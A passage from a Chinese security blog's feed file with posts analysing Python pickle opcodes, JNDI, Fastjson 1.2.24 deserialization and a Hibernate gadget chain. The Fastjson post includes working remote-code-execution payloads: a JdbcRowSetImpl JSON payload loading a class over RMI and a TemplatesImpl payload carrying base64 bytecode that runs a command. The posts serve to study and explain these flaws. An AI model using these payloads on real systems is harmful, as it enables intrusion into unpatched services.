     <span class="token keyword">return</span>    slotstate <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        state<span class="token punctuation">,</span> slotstate <span class="token operator">=</span> state    <span class="token keyword">if</span> state<span class="token punctuation">:</span><span class="token comment">#属性转字典并且逐位赋值</span>        inst_dict <span class="token operator">=</span> inst<span class="token punctuation">.</span>__dict__        <span class="token builtin">intern</span> <span class="token operator">=</span> sys<span class="token punctuation">.</span><span class="token builtin">intern</span>        <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> state<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                inst_dict<span class="token punctuation">[</span><span class="token builtin">intern</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v            <span class="token keyword">else</span><span class="token punctuation">:</span>                inst_dict<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v    <span class="token keyword">if</span> slotstate<span class="token punctuation">:</span>        <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> slotstate<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>inst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <code>b:BUILD:load_build</code>：<code>BUILD</code>操作将操作栈中末尾字典弹出作为栈中末尾对象的属性字典进行赋值操作，并且如果对象有<code>__setstate__</code>方法就调用该方法进行赋值操作</p></li><li><p><code>.</code><br>取出.操作符，对应STOP，进入<code>load_stop</code>函数</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># every pickle ends with STOP</span><span class="token keyword">def</span> <span class="token function">load_stop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    value <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">raise</span> _Stop<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>  <code>.:STOP:load_stop</code>：<code>STOP</code>操作将栈尾作为最终返回值弹出，并抛出<code>_Stop</code></p></li></ul>        <h3 id="更高协议的不同之处"   >          <a href="#更高协议的不同之处" class="heading-link"><i class="fas fa-link"></i></a><a href="#更高协议的不同之处" class="headerlink" title="更高协议的不同之处"></a>更高协议的不同之处</h3>      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> pickle </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI安全详解</title>
      <link href="/posts/6ce81c59.html"/>
      <url>/posts/6ce81c59.html</url>
      
        <content type="html"><![CDATA[        <h1 id="JNDI"   >          <a href="#JNDI" class="heading-link"><i class="fas fa-link"></i></a><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1>              <h2 id="简介"   >          <a href="#简介" class="heading-link"><i class="fas fa-link"></i></a><a href="#简介" class="headerlink" title="简介"></a>简介</h2>      <blockquote><p>JNDI（ Java Naming and Directory Interface***#Java命名和目录接口***）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）</p><p><strong>Naming Service</strong>：命名服务是将名称与值相关联的实体，称为”绑定”。它提供了一种使用”find”或”search”操作来根据名称查找对象的便捷方式。 就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器 。</p><p><strong>Directory Service</strong>：是一种特殊的Naming Service，它允许存储和搜索”目录对象”，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。</p></blockquote><p>关于JNDI和这些服务的关系具体可以看这个图</p><p><img   src="https://image.3001.net/images/20220214/1644818999_6209f237022d14165a1e9.png!small?1644818997380" style="" ></p><p>我们可以理解为JNDI是一种上层的规范，而下面的服务都是对这个规范的一个具体实现</p><p>个人理解就是Naming Service提供的服务就是将一个对象和一个url进行绑定，而具体如何实现对某个对象的加载是又下层的RMI等具体服务来执行的</p><p>就比如同样获取一个文件，我们既可以选择http服务也可以选择ftp服务，但是他们都是通过TCP/IP协议传输的</p><p>其中JDK默认内置了如下SPI：</p><ul><li>Lightweight Directory Access Protocol (LDAP)</li><li>Common Object Request Broker Architecture (CORBA) Common Object Services (COS) name service</li><li>Java Remote Method Invocation (RMI) Registry</li><li>Domain Name Service (DNS)</li></ul><p>同时JNDI分为了5个包：</p><ul><li><span class="exturl"><a class="exturl__link"   href="https://docs.oracle.com/javase/tutorial/jndi/overview/naming.html" >javax.naming</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link"   href="https://docs.oracle.com/javase/tutorial/jndi/overview/dir.html" >javax.naming.directory</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link"   href="https://docs.oracle.com/javase/tutorial/jndi/overview/dir.html" >javax.naming.ldap</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link"   href="https://docs.oracle.com/javase/tutorial/jndi/overview/event.html" >javax.naming.event</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li><span class="exturl"><a class="exturl__link"   href="https://docs.oracle.com/javase/tutorial/jndi/overview/event.html" >javax.naming.spi</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ul><p>例如上面说到的RMI Registry就是使用的Naming Service。其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。<br>代码格式如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> jndiName<span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token comment">//指定需要查找name名称</span><span class="token class-name">Context</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化默认环境</span><span class="token class-name">DataSource</span> ds <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">DataSourse</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>jndiName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查找该name的数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>部分内容引用：</p><p><span class="exturl"><a class="exturl__link"   href="https://paper.seebug.org/1091/#jndi" >https://paper.seebug.org/1091/#jndi</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson反序列化分析</title>
      <link href="/posts/94f1bd4a.html"/>
      <url>/posts/94f1bd4a.html</url>
      
        <content type="html"><![CDATA[<p>在进行fastjson反序列化前，我们要先看看为什么fastjson解析会有反序列化的漏洞，我们先来做一个正常的类，并对其使用json解析，这里我们使用1.2.24版本作为演示</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先来一个正常一点的用户类（符合JavaBean要求）</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">package org.example;public class User &#123;    private String username;    private String password;    public User(String username,String password)&#123;        this.username&#x3D;username;        this.password&#x3D;password;    &#125;    public User() &#123;    &#125;    public String getUsername() &#123;        System.out.println(&quot;getUsername&quot;);        return username;    &#125;    public void setUsername(String username) &#123;        System.out.println(&quot;setUsername&quot;);        this.username &#x3D; username;    &#125;    public String getPassword() &#123;        System.out.println(&quot;getPassword&quot;);        return password;    &#125;    public void setPassword(String password) &#123;        System.out.println(&quot;setPassword&quot;);        this.password &#x3D; password;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写个test调用一下</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">package org.example;import com.alibaba.fastjson.JSON;public class test &#123;    public static void main(String[] args) &#123;        User user&#x3D;new User(&quot;Jlan&quot;,&quot;FXXKpassword&quot;);        String json&#x3D; JSON.toJSONString(user);        System.out.println(json);    &#125;&#125;&#x2F;&#x2F;getPassword&#x2F;&#x2F;getUsername&#x2F;&#x2F;&#123;&quot;password&quot;:&quot;FXXKpassword&quot;,&quot;username&quot;:&quot;Jlan&quot;&#125;&#x2F;&#x2F;输出结果可见调用了getter方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们再来看三种不同的解析方法会对类做什么处理</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110241070.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110242083.png"></p><p>可以看到除了我们指定好类的情况下变量为对应的类，剩下的情况都是JSONObject类（废话），那我们在来看看在json中加入@type参数是什么效果</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110247830.png"></p><p>可以看到这次parse方法和指定类的parseObject方法都转换出了正确的类并且调用了setter方法，但是不指定类的parseObject方法却先调用了setter方法后调用了getter方法，这是为什么呢，我们跟入其源码看一下</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public static JSONObject parseObject(String text) &#123;    Object obj &#x3D; parse(text);    return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到其先调用了parse方法（setter被调用），然后判断这个对象是否是JSONObject对象，如果不是就调用toJSON将其转为JSONObject（getter被调用）</p><p>那现在又有一个问题，如果@type和parseObject传入的类不相同怎么办，我们先建立一个和User完全一致的Users类（名字不一样哈）</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110253552.png"></p><p>意料之中，直接报错（大家也可以试试使用Object.class，这是成功的，怀疑是先进行prase再尝试进行转换）</p><p>那么下面我们来看这个版本利用的两条getter或setter链</p>        <h3 id="com-sun-rowset-JdbcRowSetImpl"   >          <a href="#com-sun-rowset-JdbcRowSetImpl" class="heading-link"><i class="fas fa-link"></i></a><a href="#com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl"></a>com.sun.rowset.JdbcRowSetImpl</h3>      <pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/badClassName"</span><span class="token punctuation">,</span> <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就是反序列化的关键类了，我们跟入看看里面的内容，由于在进行json解析的时候调用的是setter方法，那么我们就在上面两个属性的set方法上打断点</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212130001274.png"></p><p>对于<code>dataSourceName</code>没什么，就是一个单纯的设定了一下属性，我们继续看autoCommit</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212130002735.png"></p><p>这里的set首先对conn的状态进行了判定，如果现在有一个连接那么就直接调用conn属性的setAutoCommit方法，反之就要先调用本对象的connect方法，我们跟入看看</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212130004659.png"></p><p>首先尝试获取DataSourceName的内容，并对其执行lookup方法，而lookup方法就是用于远程加载类的，所以此时我们的恶意类就被加载进去了，实现RCE</p>        <h3 id="com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl"   >          <a href="#com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl" class="heading-link"><i class="fas fa-link"></i></a><a href="#com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl" class="headerlink" title="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"></a>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</h3>      <p>又来了，字节码加载又来了</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TEMPOC</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token function">TEMPOC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open -a Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span>SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> haFndlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TEMPOC</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TEMPOC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64fin <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"TEMPOC.class"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>byte <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>fout <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>poc <span class="token operator">=</span> <span class="token string">'&#123;"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["%s"],"_name":"a.b","_tfactory":&#123;&#125;,"_outputProperties":&#123; &#125;,"_version":"1.0","allowedProtocols":"all"&#125;'</span><span class="token operator">%</span> fout<span class="token keyword">print</span> poc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token property">"_bytecodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg=="</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"_name"</span><span class="token operator">:</span><span class="token string">"a.b"</span><span class="token punctuation">,</span><span class="token property">"_tfactory"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"_outputProperties"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"_version"</span><span class="token operator">:</span><span class="token string">"1.0"</span><span class="token punctuation">,</span><span class="token property">"allowedProtocols"</span><span class="token operator">:</span><span class="token string">"all"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="1-2-24"   >          <a href="#1-2-24" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2>      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hibernate链分析</title>
      <link href="/posts/d8454e42.html"/>
      <url>/posts/d8454e42.html</url>
      
        <content type="html"><![CDATA[        <h1 id="Hibernate"   >          <a href="#Hibernate" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h1>              <h2 id="简介"   >          <a href="#简介" class="heading-link"><i class="fas fa-link"></i></a><a href="#简介" class="headerlink" title="简介"></a>简介</h2>      <p><strong>Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。 Hibernate可以应用在任何使用JDBC的场合，既可以在Java的客户端程序使用，也可以在Servlet/JSP的Web应用中使用，最具革命意义的是，Hibernate可以在应用EJB的JaveEE架构中取代CMP，完成数据持久化的重任。</strong></p>        <h2 id="前置知识"   >          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2>      <p>一个奇怪小知识，就是在java中的Class.this和this的区别</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">class Outer&#123;    String data &#x3D; &quot;Out!&quot;;    public class Inner&#123;        String data &#x3D; &quot;In!&quot;;        public String getOuterData()&#123;            return Outer.this.data; &#x2F;&#x2F; will return &quot;Out!&quot;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一次见这么写接口实现的</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;ValueHolderpublic interface DeferredInitializer&lt;T&gt; &#123;    T initialize();&#125;&#x2F;&#x2F;TypedValueprivate void readObject(ObjectInputStream ois) throws ClassNotFoundException, IOException &#123;    ois.defaultReadObject();    this.initTransients();&#125;private void initTransients() &#123;    this.hashcode &#x3D; new ValueHolder(new ValueHolder.DeferredInitializer&lt;Integer&gt;() &#123;        public Integer initialize() &#123;            return TypedValue.this.value &#x3D;&#x3D; null ? 0 : TypedValue.this.type.getHashCode(TypedValue.this.value);        &#125;    &#125;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="链分析"   >          <a href="#链分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#链分析" class="headerlink" title="链分析"></a>链分析</h2>      <pre class="line-numbers language-none"><code class="language-none">&#x2F;** * * org.hibernate.property.access.spi.GetterMethodImpl.get() * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue() * org.hibernate.type.ComponentType.getPropertyValue(C) * org.hibernate.type.ComponentType.getHashCode() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.internal.util.ValueHolder.getValue() * org.hibernate.engine.spi.TypedValue.hashCode() * * * Requires: * - Hibernate (&gt;&#x3D; 5 gives arbitrary method invocation, &lt;5 getXYZ only) * * @author mbechler *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看序列化返回数据的类型，是HashMap，看一下内容的存储结构</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211241621753.png"></p><p>两对键值对key和value都是TypedValue类，我们又知道在HashMap反序列化的时候会自动对key执行hashCode操作，所以我们就从TypedValue的hashCode方法开始跟入</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;org.hibernate.engine.spi.TypedValuepublic int hashCode() &#123;    return (Integer)this.hashcode.getValue();&#125;<span aria-hidden="true" 